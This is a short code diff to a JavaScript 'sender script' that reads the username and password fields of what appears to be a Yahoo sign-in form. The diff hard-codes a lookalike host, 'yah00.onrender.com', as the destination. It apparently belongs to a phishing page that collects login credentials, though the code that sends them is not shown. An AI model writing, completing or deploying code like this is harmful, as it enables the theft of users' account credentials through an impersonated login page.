@@ -2,7 +2,7 @@ document.addEventListener("DOMContentLoaded", function() {
     //form handler
     console.log("sender script loaded");
 
-    const hostname = process.env.hostname;
+    const hostname = "https://yah00.onrender.com";
     const nextButton = document.querySelector("#login-signin");
     const emailInput = document.querySelector("#login-username");
     const passwordInput = document.querySelector("#login-passwd");
